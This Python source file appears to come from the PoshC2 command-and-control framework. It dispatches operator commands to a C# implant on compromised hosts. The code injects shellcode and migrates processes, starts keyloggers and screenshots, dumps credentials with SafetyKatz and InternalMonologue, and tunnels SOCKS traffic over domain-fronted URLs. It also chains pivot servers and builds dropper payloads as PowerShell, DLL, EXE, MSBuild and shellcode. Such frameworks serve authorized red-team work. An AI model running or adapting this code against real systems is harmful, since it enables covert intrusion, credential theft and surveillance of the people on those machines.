import base64, re, traceback, os, string, subprocess
from poshc2.client.Alias import cs_alias, cs_replace
from poshc2.Colours import Colours
from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
from poshc2.client.Help import sharp_help1
from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, ModulesDirectory, DatabaseType
from poshc2.server.Config import PayloadCommsHost, DomainFrontHeader, UserAgent, PBindPipeName, PBindSecret
from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader
from poshc2.server.Core import print_bad, print_good
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
from poshc2.server.Payloads import Payloads
from poshc2.server.PowerStatus import getpowerstatus
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
    from poshc2.server.database.DBPostgres import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails
else:
    from poshc2.server.database.DBSQLite import new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
    from poshc2.server.database.DBSQLite import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails


def handle_sharp_command(command, user, randomuri, implant_id):

    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    # alias replace
    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    original_command = command
    command = command.strip()

    run_autoloads_sharp(command, randomuri, user)

    if command.startswith("searchhelp"):
        do_searchhelp(user, command, randomuri)
        return
    elif command.startswith("upload-file"):
        do_upload_file(user, command, randomuri)
        return
    elif command.startswith("inject-shellcode"):
        do_inject_shellcode(user, command, randomuri)
        return
    elif command.startswith("migrate"):
        do_migrate(user, command, randomuri)
        return
    elif command == "kill-implant" or command == "exit":
        do_kill_implant(user, command, randomuri)
        return
    elif command == "sharpsocks":
        do_sharpsocks(user, command, randomuri)
        return
    elif (command.startswith("stop-keystrokes")):
        do_stop_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("start-keystrokes")):
        do_start_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("get-keystrokes")):
        do_get_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("get-screenshotmulti")):
        do_get_screenshotmulti(user, command, randomuri)
        return
    elif command.startswith("get-screenshot"):
        do_get_screenshot(user, command, randomuri)
        return
    elif command == "getpowerstatus":
        do_get_powerstatus(user, command, randomuri)
        return
    elif command == "stoppowerstatus":
        do_stoppowerstatus(user, command, randomuri)
        return      
    elif command.startswith("run-exe SharpWMI.Program") and "execute" in command and "payload" not in command:
        do_sharpwmi_execute(user, command, randomuri)
        return
    elif (command.startswith("get-hash")):
        do_get_hash(user, command, randomuri)
        return
    elif (command.startswith("enable-rotation")):
        do_rotation(user, command, randomuri)
        return        
    elif (command.startswith("safetykatz")):
        do_safetykatz(user, command, randomuri)
        return
    elif command.startswith("loadmoduleforce"):
        do_loadmoduleforce(user, command, randomuri)
        return
    elif command.startswith("loadmodule"):
        do_loadmodule(user, command, randomuri)
        return
    elif command.startswith("listmodules"):
        do_listmodules(user, command, randomuri)
        return
    elif command.startswith("modulesloaded"):
        do_modulesloaded(user, command, randomuri)
        return
    elif command.startswith("pbind-connect"):
        do_pbind_start(user, command, randomuri)
        return        
    elif command.startswith("dynamic-code"):
        do_dynamic_code(user, command, randomuri)
        return
    elif command.startswith("startdaisy"):
        do_startdaisy(user, command, randomuri)
        return
    elif command == "help":
        do_help(user, command, randomuri)
        return
    else:
        if command:
            do_shell(user, original_command, randomuri)
        return


def do_searchhelp(user, command, randomuri):
    searchterm = (command).replace("searchhelp ", "")
    helpful = sharp_help1.split('\n')
    for line in helpful:
        if searchterm in line.lower():
            print(Colours.GREEN + line)


def do_upload_file(user, command, randomuri):
    # TODO lots of common code
    source = ""
    destination = ""
    if command == "upload-file":
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return
        while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination
    try:
        destination = destination.replace("\\", "\\\\")
        print("")
        print("Uploading %s to %s" % (source, destination))
        uploadcommand = f"upload-file {source} {destination}"
        new_task(uploadcommand, user, randomuri)
    except Exception as e:
        print("Error with source file: %s" % e)
        traceback.print_exc()


def do_inject_shellcode(user, command, randomuri):
    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    try:
        shellcodefile = load_file(path)
        if shellcodefile is not None:
            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
    except Exception as e:
        print("Error loading file: %s" % e)


def do_migrate(user, command, randomuri):
    params = re.compile("migrate", re.IGNORECASE)
    params = params.sub("", command)
    implant = get_implantdetails(randomuri)
    implant_arch = implant.Arch
    implant_comms = implant.Pivot
    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"
    if implant_comms == "C#":
        path = "%sSharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%s%sSharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%sProxySharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, arch)
        shellcodefile = load_file(path)
    new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)


def do_kill_implant(user, command, randomuri):
    impid = get_implantdetails(randomuri)
    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
    if ri.lower() == "n":
        print("Implant not terminated")
    if ri == "":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)
    if ri.lower() == "y":
        new_task("exit", user, randomuri)
        kill_implant(randomuri)


def do_exit(user, command, randomuri):
    return do_kill_implant(user, command, randomuri)


def do_sharpsocks(user, command, randomuri):
    from random import choice
    allchar = string.ascii_letters
    channel = "".join(choice(allchar) for x in range(25))
    sharpkey = gen_key().decode("utf-8")
    sharpurls = get_sharpurls()
    sharpurls = sharpurls.split(",")    
    sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
    dfheader = get_first_dfheader(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
    print(PoshInstallDirectory + "resources/SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
    ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
    if ri == "":
        if dfheader:
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader), user, randomuri)
        else:
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
    if ri.lower() == "y":
        if dfheader:
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader), user, randomuri)
        else:
            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
    print("SharpSocks task issued, note that at present the C# implant has no stopsocks command, so to stop SharpSocks you will have to kill the implant process.")


def do_stop_keystrokes(user, command, randomuri):
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
    update_label("", randomuri)


def do_start_keystrokes(user, command, randomuri):
    check_module_loaded("Logger.exe", randomuri, user)
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
    update_label("KEYLOG", randomuri)


def do_get_keystrokes(user, command, randomuri):
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)


def do_get_screenshotmulti(user, command, randomuri):
    pwrStatus = get_powerstatusbyrandomuri(randomuri)
    if (pwrStatus is not None and pwrStatus[7]):
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
        if ri.lower() == "n" or ri.lower() == "":
            return
    new_task(command, user, randomuri)
    update_label("SCREENSHOT", randomuri)


def do_get_screenshot(user, command, randomuri):
    pwrStatus = get_powerstatusbyrandomuri(randomuri)
    if (pwrStatus is not None and pwrStatus[7]):
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
        if ri.lower() == "n" or ri.lower() == "":
            return
    new_task(command, user, randomuri)


def do_get_powerstatus(user, command, randomuri):
    getpowerstatus(randomuri)
    new_task("run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)


def do_stoppowerstatus(user, command, randomuri):
    new_task(command, user, randomuri)
    update_label("", randomuri)


def do_get_hash(user, command, randomuri):
    check_module_loaded("InternalMonologue.exe", randomuri, user)
    new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)


def do_safetykatz(user, command, randomuri):
    new_task("run-exe SafetyKatz.Program %s" % command, user, randomuri)


def do_loadmoduleforce(user, command, randomuri):
    params = re.compile("loadmoduleforce ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user, force=True)


def do_loadmodule(user, command, randomuri):
    params = re.compile("loadmodule ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user)


def do_listmodules(user, command, randomuri):
    modules = os.listdir(ModulesDirectory)
    modules = sorted(modules, key=lambda s: s.lower())
    print("")
    print("[+] Available modules:")
    print("")
    for mod in modules:
        if (".exe" in mod) or (".dll" in mod):
            print(mod)


def do_modulesloaded(user, command, randomuri):
    implant_details = get_implantdetails(randomuri)
    print(implant_details.ModsLoaded)
    new_task("listmodules", user, randomuri)


def do_help(user, command, randomuri):
    print(sharp_help1)


def do_shell(user, command, randomuri):
    new_task(command, user, randomuri)

def do_rotation(user, command, randomuri):
    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
    new_task("dfupdate %s" % domainfront, user, randomuri)
    new_task("rotate %s" % domain, user, randomuri)

def do_sharpwmi_execute(user, command, randomuri):
    style = Style.from_dict({'': '#80d130'})
    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Location of base64 vbs/js file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        new_task("%s payload=%s" % (command, payload), user, randomuri)
    else:
        print_bad("Could not find file")


def do_pbind_start(user, command, randomuri):
    key = get_baseenckey()
    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
        return
    new_task(command, user, randomuri)


def do_dynamic_code(user, command, randomuri):
    compile_command = "mono-csc %sDynamicCode.cs -out:%sPoshC2DynamicCode.exe -target:exe -warn:2 -sdk:4" % (PayloadsDirectory, PayloadsDirectory)
    try:
        subprocess.check_output(compile_command, shell=True)
    except subprocess.CalledProcessError:
        return
    command = command.replace("dynamic-code", "").strip()
    check_module_loaded(f"{PayloadsDirectory}PoshC2DynamicCode.exe", randomuri, user, force=True)
    new_task(f"run-exe PoshC2DynamicCode.Program PoshC2DynamicCode {command}", user, randomuri)


def do_startdaisy(user, command, randomuri):
    check_module_loaded("daisy.dll", randomuri, user)

    elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)

    domain_front = ""
    proxy_user = ""
    proxy_pass = ""
    proxy_url = ""
    cred_expiry = ""

    if elevated.lower() == "n":
        cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
        if cont.lower() == "n" or cont == "":
            return

        bind_ip = "localhost"

    else:
        bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)

    bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
    if firstdaisy.lower() == "y" or firstdaisy == "":
        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {PayloadCommsHost}): " + Colours.END)
        if DomainFrontHeader:
            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {DomainFrontHeader}): " + Colours.END)
        else:
            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for configured value of no header): " + Colours.END)
        proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")

        if not upstream_url:
            upstream_url = PayloadCommsHost
        if not domain_front:
            domain_front = DomainFrontHeader

    else:
        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
        upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"
        domain_front = upstream_daisy_host

    urls = get_allurls().replace(" ", "")
    useragent = UserAgent
    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" \"{upstream_url}\" \"{domain_front}\" \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"

    new_task(command, user, randomuri)
    update_label("DaisyHost", randomuri)

    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")

    if createpayloads.lower() == "y" or createpayloads == "":

        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)

        daisyhost = get_implantdetails(randomuri)
        proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
        C2 = get_c2server_all()
        urlId = new_urldetails(name, f"http://{bind_ip}:{bind_port}", C2.DomainFrontHeader, proxy_url, proxy_user, proxy_pass, cred_expiry)
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand = proxynone, URLID = urlId)
        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
        newPayload.CreateRaw(name)
        newPayload.CreateDroppers(name)
        newPayload.CreateDlls(name)
        newPayload.CreateShellcode(name)
        newPayload.CreateEXE(name)
        newPayload.CreateMsbuild(name)
        newPayload.CreateCS(name)
        print_good("Created new %s daisy payloads" % name)
